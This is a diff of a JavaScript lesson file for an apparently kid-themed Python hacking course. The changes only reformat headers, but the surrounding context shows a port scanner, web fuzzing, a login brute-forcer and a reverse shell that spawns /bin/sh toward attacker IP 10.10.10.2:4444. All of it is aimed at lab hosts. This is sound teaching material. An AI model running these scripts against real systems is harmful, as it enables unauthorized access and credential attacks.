@@ -2,7 +2,8 @@ const LESSONS = [
   {
     title: "1. Python Basics & Variables",
     points: 30,
-    content: `<div class="htb-diagram-container"><img src="../../../assets/python_basics_diagram.png" alt="Python Basics & Variables" class="htb-diagram"></div>PLAYING WITH BOXES & LABELS: THE PYTHON ROBOT
+    content: `<div class="htb-diagram-container"><img src="../../../assets/python_basics_diagram.png" alt="Python Basics & Variables" class="htb-diagram"></div>
+ PLAYING WITH BOXES & LABELS: THE PYTHON ROBOT 
 
 Imagine you have a magical helper robot named Python! 🤖
 Python is super friendly, but it has a very short memory. To help Python remember things, we use cardboard boxes and write labels on them. In computer talk, these labeled boxes are called 'variables'!
@@ -17,14 +18,14 @@ If we want the robot to shout out what is inside a box, we tell it to 'print()':
 print("[+] Target IP: " + ip_address)
 print(f"[+] Scanning port: {target_port}")
 
-#### Line-by-Line Code Explanation:
+ LINE-BY-LINE CODE EXPLANATION 
 *   ip_address = "192.168.1.50": We grab a clean box, write the label ip_address on the outside, and put a paper strip with the text "192.168.1.50" inside it.
 *   target_port = 80: We grab another box, write target_port on it, and drop the number block 80 inside.
 *   is_active = True: We grab a third box, label it is_active, and flip the switch inside to True (which means "Yes!").
 *   print("[+] Target IP: " + ip_address): We tell our robot helper to shout out the message. The + sign is like gluing our text together with whatever is inside the ip_address box.
 *   print(f"[+] Scanning port: {target_port}"): The f prefix is like a magic window. It tells the robot to look inside the curly braces {}, find the box named target_port, read the number inside it, and shout it out as part of the sentence.
 
-Types of Toys:
+ TYPES OF TOYS 
 Python is smart enough to know what kind of toy is in each box. Text toys are called strings ('str'), and number toys are called integers ('int').
 Sometimes, if you try to glue a number toy directly to a text toy, Python gets confused! So, we can convert a number to text using str(target_port) to make them match.
 
@@ -38,7 +39,8 @@ TASK: Help Python identify variables and print functions below!`,
   {
     title: "2. Sockets & Port Scanning",
     points: 40,
-    content: `<div class="htb-diagram-container"><img src="../../../assets/python_sockets_diagram.png" alt="Sockets & Port Scanning" class="htb-diagram"></div>KNOCKING ON APARTMENT DOORS: NETWORKING WITH SOCKETS
+    content: `<div class="htb-diagram-container"><img src="../../../assets/python_sockets_diagram.png" alt="Sockets & Port Scanning" class="htb-diagram"></div>
+ KNOCKING ON APARTMENT DOORS: NETWORKING WITH SOCKETS 
 
 Imagine a computer is like a giant apartment building. 🏢
 - The street address of the building is the IP Address.
@@ -65,7 +67,7 @@ else:
 
 s.close()
 
-#### Line-by-Line Code Explanation:
+ LINE-BY-LINE CODE EXPLANATION 
 *   import socket: This opens our toy drawer and pulls out the "magic network walkie-talkies" box.
 *   target_host = "host.docker.internal": This sets a box with the street address of the toy castle we want to call.
 *   target_port = 80: This sets a box with the specific door number (door 80) we want to knock on.
@@ -76,7 +78,7 @@ s.close()
 *   print("[+] Knock knock! The door is OPEN!") / else: ...: If it's a green block, we shout that the door is open! Otherwise, we tell everyone it is closed.
 *   s.close(): We roll up our cup-and-string telephone and put it away in the toy drawer.
 
-Why connect_ex?
+ WHY CONNECT_EX? 
 If we use standard connect() and a door is locked, our robot trips and falls down (raising an error!). But connect_ex() is polite: it just returns a secret code number. If it returns 0, it means 'Open Sesame!' — the port is open and we can connect!
 
 TASK: Learn how sockets check for open ports and answer the questions.`,
@@ -89,7 +91,8 @@ TASK: Learn how sockets check for open ports and answer the questions.`,
   {
     title: "3. HTTP Requests & Web Fuzzing",
     points: 40,
-    content: `<div class="htb-diagram-container"><img src="../../../assets/python_http_diagram.png" alt="HTTP Requests & Web Fuzzing" class="htb-diagram"></div>ORDERING FOOD FROM THE RESTAURANT: WEB FUZZING
+    content: `<div class="htb-diagram-container"><img src="../../../assets/python_http_diagram.png" alt="HTTP Requests & Web Fuzzing" class="htb-diagram"></div>
+ ORDERING FOOD FROM THE RESTAURANT: WEB FUZZING 
 
 Imagine visiting a website is like going to a restaurant and ordering food. 🍔
 When you want to see a web page, you send a GET request, which is like asking the waiter: "Can I please see the menu?"
@@ -108,14 +111,14 @@ response = requests.get(url)
 print(response.status_code)
 print(response.text)
 
-#### Line-by-Line Code Explanation:
+ LINE-BY-LINE CODE EXPLANATION 
 *   import requests: We go to the closet and fetch our fast-running waiter helper named "Requests".
 *   url = "http://host.docker.internal:5000/": We set the address of the kitchen table we want to order from.
 *   response = requests.get(url): We tell our waiter to run to the kitchen table (GET request) and bring back everything they find, saving it all inside the response box.
 *   print(response.status_code): We check what code the kitchen gave us. If it says 200, they gave us the food! If it says 404, they got lost or the food doesn't exist.
 *   print(response.text): We open the food container and print out the actual recipe list (HTML source code) of the webpage.
 
-What is Web Fuzzing?
+ WHAT IS WEB FUZZING? 
 Imagine a restaurant has a secret menu that they only show to VIPs, but they won't tell you the names of the dishes! To find them, you stand at the counter and rapidly guess words: "Is there a secret admin? Is there a secret login? Is there a secret robots.txt?"
 Doing this automatically with a loop and a wordlist is called "fuzzing"!
 
@@ -129,7 +132,8 @@ TASK: Learn how HTTP status codes reveal hidden resources.`,
   {
     title: "4. Automated Brute-Forcing",
     points: 50,
-    content: `<div class="htb-diagram-container"><img src="../../../assets/python_bruteforce_diagram.png" alt="Automated Brute-Forcing" class="htb-diagram"></div>CRACKING THE TOY TREASURE CHEST: BRUTE-FORCING
+    content: `<div class="htb-diagram-container"><img src="../../../assets/python_bruteforce_diagram.png" alt="Automated Brute-Forcing" class="htb-diagram"></div>
+ CRACKING THE TOY TREASURE CHEST: BRUTE-FORCING 
 
 Imagine you found a toy treasure chest with a lock that needs a combination. 🔒
 Instead of twisting the dial slowly with your fingers, you build a super-fast mechanical finger that tries thousands of combinations every single second until the chest pops open! That is a brute-forcer.
@@ -153,7 +157,7 @@ if "Welcome" in response.text:
 else:
     print("[-] Access Denied.")
 
-#### Line-by-Line Code Explanation:
+ LINE-BY-LINE CODE EXPLANATION 
 *   import requests: We call our waiter runner helper.
 *   url = "http://...": We set the address of the castle gate control panel.
 *   payload = { "username": "admin", "password": "wrongpassword" }: We write our name (admin) and our guess password on a post-it note card. This key-value list is called a dictionary.
@@ -173,7 +177,8 @@ TASK: Understand how POST requests can automate login attempts.`,
   {
     title: "5. Python Reverse Shells",
     points: 40,
-    content: `<div class="htb-diagram-container"><img src="../../../assets/python_revshell_diagram.png" alt="Python Reverse Shells" class="htb-diagram"></div>THROWING A ROPE OUT THE WINDOW: REVERSE SHELLS
+    content: `<div class="htb-diagram-container"><img src="../../../assets/python_revshell_diagram.png" alt="Python Reverse Shells" class="htb-diagram"></div>
+ THROWING A ROPE OUT THE WINDOW: REVERSE SHELLS 
 
 Usually, if you want to control another computer, you try to connect to it from the outside. But what if the computer has a strong security shield (a firewall) that blocks all incoming visitors? 🛡️
 
@@ -198,7 +203,7 @@ os.dup2(s.fileno(), 2)
 
 subprocess.call(["/bin/sh", "-i"])
 
-#### Line-by-Line Code Explanation:
+ LINE-BY-LINE CODE EXPLANATION 
 *   import socket, subprocess, os: We open our trunk and grab three tool kits: a telephone kit (socket), a toy command room kit (subprocess), and a window-taping kit (os).
 *   attacker_ip = "10.10.10.2" and attacker_port = 4444: We write down the attacker's yard address and walkie-talkie channel so the script knows where to throw the rope.
 *   s = socket.socket(...): We tie a heavy knot on our rope (TCP network socket client).
@@ -220,7 +225,8 @@ TASK: Learn how reverse shells pivot control and answer the questions.`,
   {
     title: "6. Practical Scripting Challenge",
     points: 60,
-    content: `<div class="htb-diagram-container"><img src="../../../assets/python_challenge_diagram.png" alt="Practical Scripting Challenge" class="htb-diagram"></div>THE DETECTIVE MISSION: CAPTURING THE CASTLE FLAG
+    content: `<div class="htb-diagram-container"><img src="../../../assets/python_challenge_diagram.png" alt="Practical Scripting Challenge" class="htb-diagram"></div>
+ THE DETECTIVE MISSION: CAPTURING THE CASTLE FLAG 
 
 It is time to put on your detective hat and solve a real mystery! 🕵️‍♂️
 
@@ -266,7 +272,7 @@ EOF
 6. Run your completed script using Python:
    python3 exploit.py
 
-#### Line-by-Line Code Explanation:
+ LINE-BY-LINE CODE EXPLANATION 
 *   import requests: Call our fast-running waiter helper.
 *   url = "http://...": Write down the address of the locked chest control panel.
 *   passwords = [...]: Fill a bag with key guesses we want to try: admin, 123456, password, etc.
